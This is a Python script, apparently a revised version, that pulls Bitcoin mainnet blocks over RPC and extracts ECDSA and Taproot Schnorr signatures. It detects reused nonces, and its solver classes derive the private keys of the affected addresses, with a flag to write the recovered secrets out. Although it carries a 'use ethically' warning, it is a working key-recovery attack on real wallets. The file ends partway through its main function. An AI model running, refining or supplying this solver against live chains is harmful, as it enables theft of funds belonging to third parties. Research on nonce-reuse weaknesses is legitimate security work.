#!/usr/bin/env python3
"""
scan_fixed.py - Fixed version with robust error handling and debugging
Fixes for random stopping:
1. Better exception handling in threads
2. Proper progress tracking across threads - FIXED
3. Connection pool management
4. Rate limiting with backoff
5. Detailed error reporting
"""

import os
import sys
import json
import argparse
import hashlib
import requests
from io import BytesIO
from dataclasses import dataclass
from collections import defaultdict
from typing import Optional, List, Dict, Tuple, Set
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import traceback
import logging

# Setup logging for better debugging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# [Keep all the same imports...]
from bitcoin.core import x, CTransaction
from bitcoin.core.script import (
    CScript, OP_DUP, OP_HASH160, OP_EQUALVERIFY, OP_CHECKSIG,
    SignatureHash, SIGVERSION_BASE, SIGVERSION_WITNESS_V0,
)

try:
    from coincurve import PublicKey as CC_PublicKey, PrivateKey as CC_PrivateKey
    HAS_COINCURVE = True
except Exception:
    CC_PublicKey, CC_PrivateKey, HAS_COINCURVE = None, None, False

try:
    import btclib
    from btclib.tx import Tx as BTCLIB_Tx
    from btclib.tx.signtx import taproot_sighash as btclib_taproot_sighash
    HAS_BTCLIB = True
except Exception:
    HAS_BTCLIB = False

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# [Keep all utility functions the same...]
def modinv(a: int, n: int = SECP256K1_N) -> int:
    return pow(a % n, n - 2, n)

def int_from_be(b: bytes) -> int:
    return int.from_bytes(b, "big")

def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()

def ripemd160(b: bytes) -> bytes:
    h = hashlib.new("ripemd160"); h.update(b); return h.digest()

def hash160(b: bytes) -> bytes:
    return ripemd160(sha256(b))

def compress_pubkey(pubkey_bytes: bytes) -> bytes:
    if len(pubkey_bytes) == 33 and pubkey_bytes[0] in (2, 3): return pubkey_bytes
    if len(pubkey_bytes) == 65 and pubkey_bytes[0] == 4:
        y_int = int_from_be(pubkey_bytes[33:65])
        return bytes([2 if (y_int % 2 == 0) else 3]) + pubkey_bytes[1:33]
    return pubkey_bytes

def parse_der_signature(der_sig: bytes) -> Tuple[int, int]:
    if len(der_sig) < 8 or der_sig[0] != 0x30: raise ValueError("Bad DER")
    i = 2
    if i >= len(der_sig) or der_sig[i] != 0x02: raise ValueError("Bad DER: r")
    i += 1
    r_len = der_sig[i]; i += 1
    r = int_from_be(der_sig[i:i+r_len]); i += r_len
    if i >= len(der_sig) or der_sig[i] != 0x02: raise ValueError("Bad DER: s")
    i += 1
    s_len = der_sig[i]; i += 1
    s = int_from_be(der_sig[i:i+s_len])
    return (r, s)

def base58_encode(b: bytes) -> str:
    alphabet = b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    num = int.from_bytes(b, 'big')
    out = bytearray()
    while num > 0:
        num, rem = divmod(num, 58)
        out.append(alphabet[rem])
    pad = len(b) - len(b.lstrip(b'\0'))
    return (alphabet[0:1] * pad + out[::-1]).decode()

def privkey_to_wif(d: int, compressed: bool = True, testnet: bool = False) -> str:
    if not (1 <= d < SECP256K1_N): raise ValueError("Invalid private key")
    version = b'\xEF' if testnet else b'\x80'
    payload = version + d.to_bytes(32, 'big') + (b'\x01' if compressed else b'')
    checksum = sha256(sha256(payload))[:4]
    return base58_encode(payload + checksum)

def is_der_sig_push(b: bytes) -> bool:
    return len(b) >= 9 and b[0] == 0x30

def tagged_hash(tag: str, msg: bytes) -> bytes:
    t = sha256(tag.encode())
    return sha256(t + t + msg)

# ---------- Robust RPC Client with Better Error Handling ----------
class RobustBatchingRPC:
    def __init__(self, url: str, username: Optional[str] = None, password: Optional[str] = None, 
                 batch_size: int = 50, max_threads: int = 4):
        self.url = url
        self.auth = (username, password) if (username or password) else None
        self.batch_size = batch_size
        self.max_threads = max_threads
        self._id_counter = 0
        self.lock = threading.Lock()
        
        # Connection pooling with proper session management
        self.session_pool = []
        for _ in range(max_threads):
            session = requests.Session()
            session.headers.update({
                'Content-Type': 'application/json',
                'Connection': 'keep-alive'
            })
            # Set reasonable timeouts
            session.timeout = (30, 120)  # (connect, read)
            self.session_pool.append(session)
        
        # Multi-level caching
        self.tx_cache = {}
        self.block_cache = {}
        self.max_cache_size = 10000  # Reduced cache size
        
        # Rate limiting
        self.last_request_time = {}
        self.min_request_interval = 0.05  # 50ms between requests per thread
        
    def _get_session(self):
        """Get a session from the pool."""
        thread_id = threading.get_ident()
        return self.session_pool[thread_id % len(self.session_pool)]

    def _get_next_id(self):
        with self.lock:
            self._id_counter += 1
            return self._id_counter

    def _wait_for_rate_limit(self):
        """Thread-safe rate limiting."""
        thread_id = threading.get_ident()
        now = time.time()
        last_time = self.last_request_time.get(thread_id, 0)
        time_diff = now - last_time
        
        if time_diff < self.min_request_interval:
            sleep_time = self.min_request_interval - time_diff
            time.sleep(sleep_time)
        
        self.last_request_time[thread_id] = time.time()

    def batch_call(self, calls: List[Tuple[str, List]], max_retries: int = 5) -> List:
        """Make batch RPC calls with robust error handling."""
        if not calls:
            return []

        results = [None] * len(calls)
        session = self._get_session()
        
        for batch_start in range(0, len(calls), self.batch_size):
            batch_end = min(batch_start + self.batch_size, len(calls))
            batch_calls = calls[batch_start:batch_end]
            
            # Prepare batch payload
            payload = []
            for i, (method, params) in enumerate(batch_calls):
                payload.append({
                    "jsonrpc": "2.0",
                    "id": batch_start + i,
                    "method": method,
                    "params": params
                })
            
            # Execute batch with exponential backoff
            for retry in range(max_retries):
                try:
                    self._wait_for_rate_limit()
                    
                    logger.debug(f"Making batch call: {len(batch_calls)} requests (retry {retry})")
                    
                    response = session.post(
                        self.url, 
                        json=payload, 
                        timeout=(30, 180),  # Increased timeout
                        auth=self.auth
                    )
                    
                    response.raise_for_status()
                    batch_results = response.json()
                    
                    # Handle batch response
                    if isinstance(batch_results, list):
                        for result in batch_results:
                            idx = result.get("id", 0) - batch_start
                            if 0 <= idx < len(batch_calls):
                                if "error" in result:
                                    error = result["error"]
                                    logger.warning(f"RPC error for call {idx}: {error}")
                                    results[batch_start + idx] = {"error": error}
                                else:
                                    results[batch_start + idx] = result.get("result")
                    else:
                        # Single result case
                        if "error" in batch_results:
                            logger.warning(f"Batch RPC error: {batch_results['error']}")
                            for i in range(len(batch_calls)):
                                results[batch_start + i] = {"error": batch_results["error"]}
                        else:
                            results[batch_start] = batch_results.get("result")
                    
                    break  # Success, exit retry loop
                    
                except requests.exceptions.Timeout as e:
                    logger.warning(f"Timeout on batch call (retry {retry}): {e}")
                    if retry == max_retries - 1:
                        for i in range(len(batch_calls)):
                            results[batch_start + i] = {"error": f"Timeout: {e}"}
                    else:
                        time.sleep(min(2 ** retry, 30))  # Cap at 30 seconds
                        
                except requests.exceptions.ConnectionError as e:
                    logger.warning(f"Connection error on batch call (retry {retry}): {e}")
                    if retry == max_retries - 1:
                        for i in range(len(batch_calls)):
                            results[batch_start + i] = {"error": f"Connection error: {e}"}
                    else:
                        time.sleep(min(2 ** retry, 30))
                        
                except requests.exceptions.HTTPError as e:
                    logger.warning(f"HTTP error on batch call (retry {retry}): {e}")
                    if e.response.status_code == 429:  # Rate limited
                        sleep_time = min(2 ** retry, 60)
                        logger.info(f"Rate limited, sleeping for {sleep_time}s")
                        time.sleep(sleep_time)
                    elif retry == max_retries - 1:
                        for i in range(len(batch_calls)):
                            results[batch_start + i] = {"error": f"HTTP error: {e}"}
                    else:
                        time.sleep(2 ** retry)
                        
                except Exception as e:
                    logger.error(f"Unexpected error on batch call (retry {retry}): {e}")
                    logger.error(traceback.format_exc())
                    if retry == max_retries - 1:
                        for i in range(len(batch_calls)):
                            results[batch_start + i] = {"error": f"Unexpected error: {e}"}
                    else:
                        time.sleep(2 ** retry)
        
        return results

    def get_transactions_batch(self, txids: List[str], verbose: bool = True) -> Dict[str, dict]:
        """Efficiently fetch multiple transactions with caching and error handling."""
        if not txids:
            return {}
            
        results = {}
        to_fetch = []
        
        # Check cache first
        for txid in txids:
            if txid in self.tx_cache:
                results[txid] = self.tx_cache[txid]
            else:
                to_fetch.append(txid)
        
        if not to_fetch:
            return results
        
        logger.debug(f"Fetching {len(to_fetch)} transactions (cached: {len(results)})")
        
        # Batch fetch missing transactions
        calls = [("getrawtransaction", [txid, int(verbose)]) for txid in to_fetch]
        batch_results = self.batch_call(calls)
        
        for txid, result in zip(to_fetch, batch_results):
            if result and not (isinstance(result, dict) and "error" in result):
                results[txid] = result
                # Cache successful results
                if len(self.tx_cache) < self.max_cache_size:
                    self.tx_cache[txid] = result
            else:
                logger.debug(f"Failed to fetch transaction {txid}: {result}")
        
        return results

    def getblockhash(self, height: int) -> str:
        result = self.batch_call([("getblockhash", [height])])
        return result[0] if result and result[0] and not isinstance(result[0], dict) else None
    
    def getblock(self, blockhash: str, verbosity: int = 1):
        result = self.batch_call([("getblock", [blockhash, verbosity])])
        return result[0] if result and result[0] and not isinstance(result[0], dict) else None
    
    def getblockchaininfo(self) -> dict:
        result = self.batch_call([("getblockchaininfo", [])])
        if result and len(result) > 0 and result[0] and not isinstance(result[0], dict):
            return result[0]
        elif result and len(result) > 0 and isinstance(result[0], dict) and "error" not in result[0]:
            return result[0]
        else:
            return {}

# [Keep data structures and extractors the same...]
@dataclass
class ECDSASigEdge:
    r: int; s: int; z: int; sighash_type: int; pubkey_hex: str; txid: str; vin: int; is_witness: bool; script_type: str

@dataclass
class SchnorrSigEdge:
    r_x: int; s: int; e: int; sighash_type: int; pubkey_xonly_hex: str; txid: str; vin: int; script_type: str

@dataclass
class LeakFinding:
    kind: str; detail: dict

class P2WPKHExtractor:
    def extract(self, tx_json: dict, vin_idx: int):
        vin = tx_json["vin"][vin_idx]
        out = []
        wit = vin.get("txinwitness")
        if isinstance(wit, list) and len(wit) >= 2:
            try:
                sig = bytes.fromhex(wit[0])
                pub = bytes.fromhex(wit[-1])
                if len(pub) in (33, 65) and is_der_sig_push(sig):
                    out.append((sig, pub, True, "p2wpkh-like"))
            except: pass
        return out

class P2PKHExtractor:
    def _parse_pushes(self, b: bytes) -> List[bytes]:
        out, i, n = [], 0, len(b)
        while i < n:
            op = b[i]; i += 1
            if 1 <= op <= 75: out.append(b[i:i+op]); i += op
            elif op == 76 and i < n: l=b[i]; i+=1; out.append(b[i:i+l]); i += l
            else: break
        return out
    
    def extract(self, tx_json: dict, vin_idx: int):
        vin = tx_json["vin"][vin_idx]
        out = []
        ss_hex = vin.get("scriptSig", {}).get("hex")
        if ss_hex:
            try:
                items = self._parse_pushes(bytes.fromhex(ss_hex))
                if len(items) >= 2 and len(items[-1]) in (33, 65) and is_der_sig_push(items[0]):
                    out.append((items[0], items[-1], False, "p2pkh"))
            except: pass
        return out

class TaprootKeypathExtractor:
    def __init__(self): 
        self.enabled = HAS_BTCLIB and HAS_COINCURVE
    
    def is_p2tr_spk(self, spk_hex: str) -> bool:
        try: 
            b = bytes.fromhex(spk_hex)
            return len(b) == 34 and b[0] == 0x51 and b[1] == 0x20
        except: 
            return False
    
    def extract_edges(self, tx_json: dict, rawtx_hex: str, prevouts: List[dict], txid: str) -> List[SchnorrSigEdge]:
        if not self.enabled: return []
        edges = []
        try: 
            tx_b = BTCLIB_Tx.from_bytes(bytes.fromhex(rawtx_hex))
        except: 
            return []
        
        spent_outputs = []
        for p in prevouts:
            if p and 'value' in p and 'scriptPubKey' in p:
                spent_outputs.append((
                    int(round(p['value'] * 100_000_000)), 
                    bytes.fromhex(p['scriptPubKey']['hex'])
                ))
            else:
                spent_outputs.append((0, b''))
        
        for vin_idx, vin in enumerate(tx_json.get("vin", [])):
            wit = vin.get("txinwitness")
            if not (isinstance(wit, list) and len(wit) >= 1): continue
            try: 
                sig_bytes = bytes.fromhex(wit[0])
            except: 
                continue
            
            sighash_type = 0x00 if len(sig_bytes) == 64 else sig_bytes[-1] if len(sig_bytes) == 65 else -1
            if sighash_type == -1 or (sighash_type & 0x03) not in (0x00, 0x01) or (sighash_type & 0x80) != 0: 
                continue
            
            sig_raw = sig_bytes[:64]
            prevout = prevouts[vin_idx] if vin_idx < len(prevouts) else None
            if not prevout or not self.is_p2tr_spk(prevout['scriptPubKey']['hex']): 
                continue
            
            output_key_xonly = bytes.fromhex(prevout['scriptPubKey']['hex'][4:])
            try: 
                msg32 = btclib_taproot_sighash(tx_b, vin_idx, sighash_type, spent_outputs)
            except: 
                continue
            
            r_bytes, s_bytes = sig_raw[:32], sig_raw[32:]
            e_bytes = tagged_hash("BIP0340/challenge", r_bytes + output_key_xonly + msg32)
            edges.append(SchnorrSigEdge(
                r_x=int_from_be(r_bytes), s=int_from_be(s_bytes), 
                e=int_from_be(e_bytes) % SECP256K1_N, 
                sighash_type=sighash_type, 
                pubkey_xonly_hex=output_key_xonly.hex(), 
                txid=txid, vin=vin_idx, 
                script_type="p2tr-keypath"
            ))
        return edges

# [Keep analyzers the same but add thread safety...]
class ThreadSafeECDSAAnalyzer:
    def __init__(self):
        self.extractors = [P2WPKHExtractor(), P2PKHExtractor()]
        self.edges = []
        self.edges_by_rq = defaultdict(list)
        self.r_counts = defaultdict(int)
        self.pubkey_counts = defaultdict(int)
        self.lock = threading.Lock()  # Thread safety
    
    def _p2pkh_script_code(self, pubkey_bytes: bytes) -> CScript:
        return CScript([OP_DUP, OP_HASH160, hash160(pubkey_bytes), OP_EQUALVERIFY, OP_CHECKSIG])
    
    def _compute_z(self, rawtx_hex: str, vin_idx: int, sht: int, sc: CScript, amt: int, is_wit: bool) -> int:
        ctx = CTransaction.deserialize(BytesIO(x(rawtx_hex)))
        sigver = SIGVERSION_WITNESS_V0 if is_wit else SIGVERSION_BASE
        digest = SignatureHash(sc, ctx, vin_idx, sht, amount=amt, sigversion=sigver)
        return int_from_be(digest) % SECP256K1_N
    
    def process_tx_batch(self, transactions_with_prevouts: List[Tuple[dict, List[Optional[dict]]]]):
        """Process multiple transactions with thread safety."""
        local_edges = []
        local_edges_by_rq = defaultdict(list)
        local_r_counts = defaultdict(int)
        local_pubkey_counts = defaultdict(int)
        
        for tx_json, prevouts in transactions_with_prevouts:
            try:
                self._process_tx_local(tx_json, prevouts, local_edges, local_edges_by_rq, local_r_counts, local_pubkey_counts)
            except Exception as e:
                logger.debug(f"Error processing transaction {tx_json.get('txid', 'unknown')}: {e}")
        
        # Merge results thread-safely
        with self.lock:
            self.edges.extend(local_edges)
            for key, edges in local_edges_by_rq.items():
                self.edges_by_rq[key].extend(edges)
            for r, count in local_r_counts.items():
                self.r_counts[r] += count
            for pubkey, count in local_pubkey_counts.items():
                self.pubkey_counts[pubkey] += count
    
    def _process_tx_local(self, tx_json: dict, prevouts: List[Optional[dict]], 
                          local_edges, local_edges_by_rq, local_r_counts, local_pubkey_counts):
        """Process single transaction locally."""
        txid, raw_hex = tx_json['txid'], tx_json['hex']
        
        for vin_idx, vin in enumerate(tx_json.get("vin", [])):
            prevout_data = prevouts[vin_idx] if vin_idx < len(prevouts) else None
            if not prevout_data or 'value' not in prevout_data: continue
            
            amount_sats = int(round(prevout_data["value"] * 100_000_000))
            
            for ex in self.extractors:
                for sig_with_type, pubkey, is_wit, stype in ex.extract(tx_json, vin_idx):
                    try: 
                        r, s = parse_der_signature(sig_with_type[:-1])
                    except: 
                        continue
                    
                    pub_c = compress_pubkey(pubkey)
                    sc = self._p2pkh_script_code(pub_c)
                    try: 
                        z = self._compute_z(raw_hex, vin_idx, sig_with_type[-1], sc, amount_sats if is_wit else 0, is_wit)
                    except: 
                        continue
                    
                    r_mod = r % SECP256K1_N
                    s_mod = s % SECP256K1_N
                    pubkey_hex = pub_c.hex()
                    
                    edge = ECDSASigEdge(
                        r=r_mod, s=s_mod, z=z, 
                        sighash_type=sig_with_type[-1], 
                        pubkey_hex=pubkey_hex, 
                        txid=txid, vin=vin_idx, 
                        is_witness=is_wit, script_type=stype
                    )
                    
                    local_edges.append(edge)
                    local_edges_by_rq[(r_mod, pubkey_hex)].append(edge)
                    local_r_counts[r_mod] += 1
                    local_pubkey_counts[pubkey_hex] += 1
    
    def get_stats(self):
        with self.lock:
            return len(self.edges), len(self.r_counts), len(self.pubkey_counts)
    
    def detect_duplicate_rq(self) -> List[LeakFinding]:
        findings = []
        with self.lock:
            for (r, q), edges in self.edges_by_rq.items():
                if len(edges) >= 2 and len({(e.s, e.z) for e in edges}) >= 2:
                    findings.append(LeakFinding(
                        kind="ecdsa_duplicate_rq", 
                        detail={"r": str(r), "pubkey": q, "count": len(edges), "txids": [e.txid for e in edges]}
                    ))
        return findings

class ThreadSafeSchnorrAnalyzer:
    def __init__(self):
        self.tap_extractor = TaprootKeypathExtractor()
        self.edges = []
        self.edges_by_rq = defaultdict(list)
        self.r_counts = defaultdict(int)
        self.pubkey_counts = defaultdict(int)
        self.lock = threading.Lock()
    
    def process_tx_batch(self, transactions_with_prevouts: List[Tuple[dict, List[Optional[dict]]]]):
        """Process multiple transactions with thread safety."""
        if not self.tap_extractor.enabled: 
            return
            
        local_edges = []
        local_edges_by_rq = defaultdict(list)
        local_r_counts = defaultdict(int)
        local_pubkey_counts = defaultdict(int)
        
        for tx_json, prevouts in transactions_with_prevouts:
            try:
                txid, raw_hex = tx_json['txid'], tx_json['hex']
                valid_prevouts = [p if (p and 'value' in p and 'scriptPubKey' in p) else {} for p in prevouts]
                edges = self.tap_extractor.extract_edges(tx_json, raw_hex, valid_prevouts, txid)
                
                for edge in edges:
                    local_edges.append(edge)
                    local_edges_by_rq[(edge.r_x, edge.pubkey_xonly_hex)].append(edge)
                    local_r_counts[edge.r_x] += 1
                    local_pubkey_counts[edge.pubkey_xonly_hex] += 1
            except Exception as e:
                logger.debug(f"Error processing Schnorr transaction {tx_json.get('txid', 'unknown')}: {e}")
        
        # Merge results thread-safely
        with self.lock:
            self.edges.extend(local_edges)
            for key, edges in local_edges_by_rq.items():
                self.edges_by_rq[key].extend(edges)
            for r, count in local_r_counts.items():
                self.r_counts[r] += count
            for pubkey, count in local_pubkey_counts.items():
                self.pubkey_counts[pubkey] += count
    
    def get_stats(self):
        with self.lock:
            return len(self.edges), len(self.r_counts), len(self.pubkey_counts)
    
    def detect_duplicate_rq(self) -> List[LeakFinding]:
        findings = []
        with self.lock:
            for (r, q), edges in self.edges_by_rq.items():
                if len(edges) >= 2 and len({(e.s, e.e) for e in edges}) >= 2:
                    findings.append(LeakFinding(
                        kind="schnorr_duplicate_rq", 
                        detail={"r_x": str(r), "pubkey_xonly": q, "count": len(edges), "txids": [e.txid for e in edges]}
                    ))
        return findings

# ---------- FIXED: Robust Processing with Better Error Handling ----------
def process_blocks_robust(rpc: RobustBatchingRPC, start_height: int, end_height: int, 
                          ecdsa_analyzer, schnorr_analyzer, max_workers: int = 2):
    """Process blocks with robust error handling and progress tracking."""
    total_blocks = end_height - start_height + 1
    
    # FIXED: Use a proper thread-safe counter instead of threading.local()
    processed_count = {'value': 0}
    progress_lock = threading.Lock()
    
    # Use a more conservative progress bar
    pbar = tqdm(total=total_blocks, desc="Processing blocks", 
                position=0, leave=True) if HAS_TQDM else None
    
    def process_block_range(height_range):
        """Process a range of blocks with detailed error handling."""
        local_processed = 0
        thread_id = threading.get_ident()
        
        try:
            logger.info(f"Thread {thread_id}: Processing blocks {height_range[0]}-{height_range[-1]}")
            
            # Fetch block hashes in smaller batches
            hash_calls = [("getblockhash", [h]) for h in height_range]
            block_hashes = rpc.batch_call(hash_calls)
            
            valid_hashes = [bh for bh in block_hashes if bh and not isinstance(bh, dict)]
            if len(valid_hashes) != len(height_range):
                logger.warning(f"Thread {thread_id}: Only got {len(valid_hashes)}/{len(height_range)} block hashes")
            
            # Fetch blocks in smaller batches
            block_calls = [("getblock", [bh, 2]) for bh in valid_hashes]
            blocks = rpc.batch_call(block_calls)
            
            for i, block in enumerate(blocks):
                if not block or (isinstance(block, dict) and "error" in block):
                    logger.warning(f"Thread {thread_id}: Failed to get block {height_range[i] if i < len(height_range) else 'unknown'}")
                    continue
                    
                if 'tx' not in block:
                    logger.warning(f"Thread {thread_id}: Block missing transactions")
                    continue
                    
                try:
                    # Collect all unique txids for prevouts - but be smarter about it
                    needed_txids = set()
                    tx_prevout_map = {}
                    
                    for tx in block['tx']:
                        prevout_txids = []
                        for vin in tx.get('vin', []):
                            if 'txid' in vin and 'vout' in vin and vin['txid'] != '0' * 64:  # Skip coinbase
                                needed_txids.add(vin['txid'])
                                prevout_txids.append(vin['txid'])
                            else:
                                prevout_txids.append(None)
                        tx_prevout_map[tx['txid']] = prevout_txids
                    
                    # Batch fetch needed prevouts (this is the bottleneck)
                    prevout_txs = {}
                    if needed_txids:
                        try:
                            prevout_txs = rpc.get_transactions_batch(list(needed_txids), verbose=True)
                            logger.debug(f"Thread {thread_id}: Fetched {len(prevout_txs)}/{len(needed_txids)} prevout transactions")
                        except Exception as e:
                            logger.warning(f"Thread {thread_id}: Error fetching prevouts: {e}")
                    
                    # Process transactions in this block
                    transactions_batch = []
                    for tx in block['tx']:
                        prevouts = []
                        prevout_txids = tx_prevout_map.get(tx['txid'], [])
                        
                        for j, vin in enumerate(tx.get('vin', [])):
                            if j < len(prevout_txids) and prevout_txids[j]:
                                prev_tx = prevout_txs.get(prevout_txids[j])
                                if (prev_tx and 'vout' in prev_tx and 
                                    vin.get('vout', 0) < len(prev_tx['vout'])):
                                    prevouts.append(prev_tx['vout'][vin['vout']])
                                else:
                                    prevouts.append(None)
                            else:
                                prevouts.append(None)
                        
                        transactions_batch.append((tx, prevouts))
                    
                    # Process the batch
                    if transactions_batch:
                        ecdsa_analyzer.process_tx_batch(transactions_batch)
                        schnorr_analyzer.process_tx_batch(transactions_batch)
                    
                    local_processed += 1
                    
                    # FIXED: Update progress thread-safely using proper dict access
                    with progress_lock:
                        processed_count['value'] += 1
                        if pbar:
                            pbar.update(1)
                        elif processed_count['value'] % 25 == 0:
                            print(f"Processed {processed_count['value']}/{total_blocks} blocks...")
                            
                except Exception as e:
                    logger.error(f"Thread {thread_id}: Error processing block {i}: {e}")
                    logger.error(traceback.format_exc())
                    local_processed += 1  # Still count it as processed to avoid hanging
                    
                    # FIXED: Update progress thread-safely
                    with progress_lock:
                        processed_count['value'] += 1
                        if pbar:
                            pbar.update(1)
                    
        except Exception as e:
            logger.error(f"Thread {thread_id}: Fatal error in block range processing: {e}")
            logger.error(traceback.format_exc())
            
        logger.info(f"Thread {thread_id}: Completed {local_processed} blocks")
        return local_processed
    
    # Process blocks in smaller, more manageable chunks
    chunk_size = max(1, min(50, total_blocks // (max_workers * 2)))  # Smaller chunks
    ranges = []
    for i in range(start_height, end_height + 1, chunk_size):
        end_chunk = min(i + chunk_size - 1, end_height)
        ranges.append(list(range(i, end_chunk + 1)))
    
    logger.info(f"Processing {len(ranges)} chunks with {max_workers} workers (chunk size: {chunk_size})")
    
    # Use reduced number of workers to avoid overwhelming the API
    total_processed = 0
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        try:
            futures = []
            for range_chunk in ranges:
                future = executor.submit(process_block_range, range_chunk)
                futures.append(future)
            
            # Process completed futures
            for future in as_completed(futures, timeout=3600):  # 1 hour timeout
                try:
                    chunk_processed = future.result(timeout=300)  # 5 minute timeout per chunk
                    total_processed += chunk_processed
                except Exception as e:
                    logger.error(f"Error in future result: {e}")
                    logger.error(traceback.format_exc())
                    
        except KeyboardInterrupt:
            logger.info("Interrupted by user")
            executor.shutdown(wait=False)
            raise
        except Exception as e:
            logger.error(f"Error in thread pool execution: {e}")
            logger.error(traceback.format_exc())
    
    if pbar:
        pbar.close()
    
    return total_processed

# Add solver classes (same as before but with better error handling)
class ECDSASolver:
    def __init__(self, analyzer):
        self.A = analyzer
        if not HAS_COINCURVE: 
            raise RuntimeError("coincurve not available for solver.")
    
    def _pub_from_priv(self, xpriv: int) -> str:
        return CC_PrivateKey(xpriv.to_bytes(32, 'big')).public_key.format(compressed=True).hex()
    
    def derive(self) -> Tuple[Dict[str, int], Dict[int, int]]:
        x_by_q: Dict[str, int] = {}
        k_by_r: Dict[int, int] = {}
        
        with self.A.lock:
            edges_by_rq = dict(self.A.edges_by_rq)
        
        for (r, q), edges in edges_by_rq.items():
            if len(edges) < 2: continue
            uniq = list({(e.z, e.s): e for e in edges}.values())
            if len(uniq) < 2: continue
            
            for i in range(len(uniq)):
                for j in range(i + 1, len(uniq)):
                    e1, e2 = uniq[i], uniq[j]
                    if e1.z == e2.z: continue
                    try:
                        s_delta_inv = modinv(e1.s - e2.s)
                        k = ((e1.z - e2.z) * s_delta_inv) % SECP256K1_N
                        if k == 0: continue
                        r_inv = modinv(r)
                        xpriv = ((e1.s * k - e1.z) * r_inv) % SECP256K1_N
                        if 1 <= xpriv < SECP256K1_N and self._pub_from_priv(xpriv).lower() == q.lower():
                            x_by_q[q] = xpriv
                            k_by_r[r] = k
                            break
                    except:
                        continue
                if q in x_by_q: break
        return x_by_q, k_by_r

class SchnorrSolver:
    def __init__(self, analyzer):
        self.A = analyzer
        if not HAS_COINCURVE: 
            raise RuntimeError("coincurve not available for solver.")
    
    def _pub_from_priv_xonly(self, xpriv: int) -> str:
        return CC_PrivateKey(xpriv.to_bytes(32, 'big')).public_key.format(compressed=False)[1:33].hex()
    
    def derive(self) -> Tuple[Dict[str, int], Dict[int, int]]:
        x_by_q: Dict[str, int] = {}
        k_by_r: Dict[int, int] = {}
        
        with self.A.lock:
            edges_by_rq = dict(self.A.edges_by_rq)
        
        for (r, q), edges in edges_by_rq.items():
            if len(edges) < 2: continue
            uniq = list({(e.s, e.e): e for e in edges}.values())
            if len(uniq) < 2: continue
            e1, e2 = uniq[0], uniq[1]
            try:
                e_delta_inv = modinv(e1.e - e2.e)
                xpriv = ((e1.s - e2.s) * e_delta_inv) % SECP256K1_N
                if not (1 <= xpriv < SECP256K1_N): continue
                if self._pub_from_priv_xonly(xpriv).lower() != q.lower(): continue
                x_by_q[q] = xpriv
                k = (e1.s - e1.e * xpriv) % SECP256K1_N
                if k != 0: k_by_r[r] = k
            except:
                continue
        return x_by_q, k_by_r

def main():
    ap = argparse.ArgumentParser(description="Robust High-Performance ECDSA + Taproot Scanner")
    ap.add_argument("--start", type=int, help="Start block height", required=True)
    ap.add_argument("--end", type=int, help="End block height", required=True)
    ap.add_argument("--batch-size", type=int, default=50, help="RPC batch size (reduced default)")
    ap.add_argument("--workers", type=int, default=2, help="Number of worker threads (reduced default)")
    ap.add_argument("--out-json", type=str, help="Write findings JSON")
    ap.add_argument("--solve", action="store_true", help="Attempt secret derivation")
    ap.add_argument("--out-secrets", type=str, help="Write recovered secrets JSON")
    ap.add_argument("--debug", action="store_true", help="Enable debug logging")
    args = ap.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    print(f"--- ROBUST HIGH-PERFORMANCE VERSION ---")
    print(f"--- Batch size: {args.batch_size}, Workers: {args.workers} ---")
    print("--- WARNING: MAINNET SOLVER IS ENABLED. USE ETHICALLY. ---")

    # Setup RPC (simplified to match working version)
    rpc_url = os.environ.get("RPC_URL")
    rpc_user = os.environ.get("RPC_USER")
    rpc_pass = os.environ.get("RPC_PASSWORD")
    if not rpc_url:
        print("Fatal: Please set RPC_URL environment variable.", file=sys.stderr)
        sys.exit(1)

    # Create robust RPC client with conservative settings
    try:
        rpc = RobustBatchingRPC(rpc_url, rpc_user, rpc_pass,
                               batch_size=args.batch_size, max_threads=args.workers)
        print("RPC client initialized successfully")
    except Exception as e:
        print(f"Error initializing RPC client: {e}", file=sys.stderr)
        sys.exit(1)
    
    # Get chain info (simplified to match working version)
    try:
        print("Connecting to Bitcoin RPC...")
        chain_info = rpc.getblockchaininfo()
        print(f"Raw chain_info response: {chain_info}")  # Debug output
        
        if not chain_info:
            raise Exception("getblockchaininfo returned None or empty response")
            
        chain = chain_info.get("chain", "main")
        current_height = chain_info.get("blocks", 0)
        
        if current_height == 0:
            raise Exception("Got 0 blocks from getblockchaininfo - connection may be invalid")
            
        print(f"Connected to {chain}. Current height: {current_height}")
        
        if args.end > current_height:
            print(f"Warning: End height {args.end} is beyond current tip {current_height}")
            args.end = current_height
            
    except Exception as e:
        print(f"Error getting blockchain info: {e}", file=sys.stderr)
        print("Please check:", file=sys.stderr)
        print("1. RPC_URL is correct and accessible", file=sys.stderr)
        print("2. RPC_USER and RPC_PASSWORD are set correctly (if required)", file=sys.stderr)
        print("3. Bitcoin node is running and RPC is enabled", file=sys.stderr)
        print(f"   Current RPC_URL: {rpc_url}", file=sys.stderr)
        sys.exit(1)
    
    print(f"Processing blocks {args.start} to {args.end} ({args.end - args.start + 1} blocks)...")
    
    # Initialize thread-safe analyzers
    ecdsa_analyzer = ThreadSafeECDSAAnalyzer()
    schnorr_analyzer = ThreadSafeSchnorrAnalyzer()
    
    # Process blocks with robust error handling
    start_time = time.time()
    try:
        total_processed = process_blocks_robust(
            rpc, args.start, args.end, ecdsa_analyzer, schnorr_analyzer, args.workers
        )
    except KeyboardInterrupt:
        print("\nInterrupted by user. Analyzing partial results...")
        total_processed = -1
    except Exception as e:
        print(f"Fatal error during processing: {e}", file=sys.stderr)
        logger.error(traceback.format_exc())
        total_processed = -1
    
    elapsed = time.time() - start_time
    
    if total_processed > 0:
        print(f"\nProcessed {total_processed} blocks in {elapsed:.2f} seconds ({total_processed/elapsed:.2f} blocks/sec)")
    else:
        print(f"\nPartial processing completed in {elapsed:.2f} seconds")

    # Analysis & Reporting
    print("\n--- Analysis Complete ---")
    e_total, e_r, e_q = ecdsa_analyzer.get_stats()
    s_total, s_r, s_q = schnorr_analyzer.get_stats()
